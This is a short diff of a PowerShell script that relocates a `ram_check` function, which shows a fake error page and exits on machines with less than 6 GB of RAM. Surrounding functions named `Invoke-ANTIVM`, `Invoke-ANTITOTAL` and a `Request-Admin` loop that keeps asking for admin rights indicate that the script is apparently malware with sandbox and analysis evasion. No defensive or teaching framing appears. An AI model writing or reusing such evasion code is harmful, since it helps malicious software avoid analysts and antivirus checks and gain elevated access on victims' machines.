@@ -90,6 +90,15 @@ function Search-Username ($usernames) {
     return $false
 }
 
+function ram_check {
+    $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % {[Math]::Round(($_.Sum / 1GB),2)}
+    if ($ram -lt 6) {
+        make_error_page "RAM CHECK FAILED"
+        Start-Sleep -s 3
+        exit
+    }
+}
+
 function Invoke-ANTIVM {
 	ram_check
     $processnames= @(
@@ -190,16 +199,6 @@ function Invoke-ANTITOTAL {
     }
     Invoke-ANTIVM
 }
-
-function ram_check {
-    $ram = Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % {[Math]::Round(($_.Sum / 1GB),2)}
-    if ($ram -lt 6) {
-        make_error_page "RAM CHECK FAILED"
-        Start-Sleep -s 3
-        exit
-    }
-}
-
 
 function Request-Admin {
     while(!(Invoke-Admin_Check)) {
